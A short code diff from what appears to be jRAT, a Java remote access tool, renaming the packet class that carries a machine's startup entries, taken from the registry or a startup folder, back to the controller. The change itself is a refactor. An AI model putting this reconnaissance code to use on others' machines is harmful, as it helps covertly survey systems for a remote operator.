@@ -2,7 +2,6 @@ package jrat.module.system.packets;
 
 import jrat.client.Connection;
 import jrat.client.packets.incoming.IncomingPacket;
-import jrat.client.utils.Utils;
 import oslib.OperatingSystem;
 
 import java.io.BufferedReader;
@@ -24,7 +23,7 @@ public class Packet78RegistryStartup implements IncomingPacket {
 				while ((line = reader.readLine()) != null) {
 					String[] args = line.trim().split("    ");
 
-					con.addToSendQueue(new Packet53RegistryStartup(args[0]));
+					con.addToSendQueue(new Packet53Startup(args[0]));
 				}
 				reader.close();
             } else  {
@@ -45,11 +44,11 @@ public class Packet78RegistryStartup implements IncomingPacket {
 
                 File[] files =  new File(path).listFiles();
                 for (File file : files) {
-                    con.addToSendQueue(new Packet53RegistryStartup(file.getName()));
+                    con.addToSendQueue(new Packet53Startup(file.getName()));
                 }
             }
 		} catch (Exception ex) {
-			con.addToSendQueue(new Packet53RegistryStartup("Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
+			con.addToSendQueue(new Packet53Startup("Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
 		}
 	}
 
